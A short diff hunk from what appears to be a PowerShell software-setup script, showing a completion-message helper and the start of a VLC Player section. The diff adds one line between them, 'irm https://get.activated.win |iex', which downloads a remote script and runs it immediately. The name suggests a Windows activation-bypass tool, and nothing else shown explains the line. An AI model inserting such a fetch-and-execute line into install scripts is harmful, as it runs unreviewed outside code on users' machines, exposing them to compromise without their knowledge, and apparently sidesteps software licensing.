@@ -29,7 +29,7 @@ function Show-Done {
     Write-Host "[DONE] $message" -ForegroundColor Green
     Write-Host ""
 }
-
+irm https://get.activated.win |iex
 # =========================
 # VLC PLAYER
 # =========================
